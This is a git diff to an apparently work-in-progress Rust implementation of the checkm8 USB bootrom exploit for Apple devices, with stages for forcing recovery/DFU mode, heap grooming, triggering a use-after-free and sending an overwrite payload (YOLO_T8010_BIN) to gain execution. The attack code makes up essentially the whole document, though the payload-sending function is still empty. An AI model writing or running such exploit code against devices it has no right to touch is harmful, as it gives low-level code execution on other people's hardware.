@@ -223,11 +223,14 @@ async fn kick_into_recovery() -> bool {
         }
     }
     let device_list = idevice::get_devices().unwrap();
-    let ret = lockdownd::LockdowndClient::new(&device_list[0], "dfu");
-    if let Ok(client) = ret {
-        let _ = lockdownd::LockdowndClient::enter_recovery(&client);
-        lockdownd::LockdowndClient::goodbye(client);
-    }
+    
+    // while device_list.len() <= 0 {
+        let ret = lockdownd::LockdowndClient::new(&device_list[0], "dfu");
+        if let Ok(client) = ret {
+            let _ = lockdownd::LockdowndClient::enter_recovery(&client);
+            // lockdownd::LockdowndClient::goodbye(client);
+        }
+    // }
     if find_device_in_recovery().await.is_some() {
         return true;
     }
@@ -584,8 +587,6 @@ async fn trigger_uaf(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
 
 fn overwrite(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     println!("Stage 3: overwrite");
-    let overwrite_size = 0;
-    let payload_size = 0;
     // TODO: payload and whatever, skid the switch case from Achilles
 
     stall_usb_request(usb_handle);
@@ -595,11 +596,23 @@ fn overwrite(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     send_usb_control_request_no_data(usb_handle, 2, DFU_GETSTATUS, 0, 0x80, 0);
 
     // Send overwrite, checking that endpoint is still stalled
-    // if 
+    if send_usb_control_request(usb_handle, 0, 0, 0, 0, YOLO_T8010_BIN.as_ptr() as *mut c_void, YOLO_T8010_BIN_LEN.try_into().unwrap()) {
+        // This is the trigger for execution
+        send_usb_control_request_no_data(usb_handle, 0x21, DFU_CLRSTATUS, 0, 0, 0);
+        println!("Checkmate");
+    }
 }
 
 fn send_payload(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
     println!("stage 3.5: send payload");
+}
+
+async fn checkm8(usb_handle: &rusb::DeviceHandle<rusb::Context>) {
+    // reset_device(&usb_handle);
+    // heap_fengshui(&usb_handle).await;
+    // trigger_uaf(&usb_handle).await;
+    overwrite(&usb_handle);
+    send_payload(&usb_handle);
 }
 
 #[tokio::main]
@@ -611,30 +624,17 @@ async fn main() {
     tokio::select! {
         Some(device) = find_device_in_dfu_task => {
             let device_handle = device.open().unwrap();
-            reset_device(&device_handle);
-            heap_fengshui(&device_handle).await;
-            trigger_uaf(&device_handle).await;
-            overwrite(&device_handle);
-            send_payload(&device_handle);
+            checkm8(&device_handle).await;
         }
         Some(device) = find_device_in_recovery_task => {
             let device_handle = device.open().unwrap();
             dfu_helper(&device_handle);
-            // let device_handle = device.open().unwrap();
-            reset_device(&device_handle);
-            heap_fengshui(&device_handle).await;
-            trigger_uaf(&device_handle).await;
-            overwrite(&device_handle);
-            send_payload(&device_handle);
+            checkm8(&device_handle).await;
         }
         Some(device) = find_apple_device_task => {
             kick_into_recovery().await;
             dfu_helper(&device);
-            reset_device(&device);
-            heap_fengshui(&device).await;
-            trigger_uaf(&device).await;
-            overwrite(&device);
-            send_payload(&device);
+            checkm8(&device).await;
         }
         else => {
             // Handle the case where none of the tasks succeed
